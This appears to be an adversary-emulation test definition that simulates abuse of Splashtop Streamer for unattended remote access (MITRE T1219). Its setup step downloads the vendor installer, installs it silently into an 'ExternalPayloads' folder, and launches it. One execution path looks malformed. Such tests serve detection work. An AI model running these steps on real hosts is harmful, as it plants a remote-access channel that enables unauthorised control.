api_version: "2.0"
name: Splashtop Streamer Execution
description: An adversary may attempt to use Splashtop Streamer to gain unattended remote interactive access. Upon successful execution, Splashtop streamer will be executed.
args:
    - name: srserver_exe
      type: string
      default: SRServer.exe
uuid: 3e1858ee-3550-401c-86ec-5e70ed79295b
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1219: Remote Access Software'
requirements:
    platforms:
        - os: windows
steps:
    - name: Splashtop Streamer must be installed in the location
      inline: |
        if (Test-Path "C:\Program Files (x86)\Splashtop\Splashtop Remote\Server\#{srserver_exe}") {exit 0} else {{Write-Host Downloading Splashtop Streamer
        New-Item -Type Directory "C:\Temp\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://download.splashtop.com/win/Splashtop_Streamer_Win_INSTALLER_v3.6.4.1.exe" -OutFile  "C:\Temp\ExternalPayloads\Splashtop.exe"
        Write-Host Installing Splashtop Streamer
        Start-Process "c:\Temp\ExternalPayloads\Splashtop.exe" -Wait -ArgumentList "/s"}}
      executor: powershell
    - name: splashtop-streamer-execution
      inline: Start-Process -FilePath "C:Program Files (x86)\Splashtop\Splashtop Remote\Server\{{.Args.srserver_exe}}"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
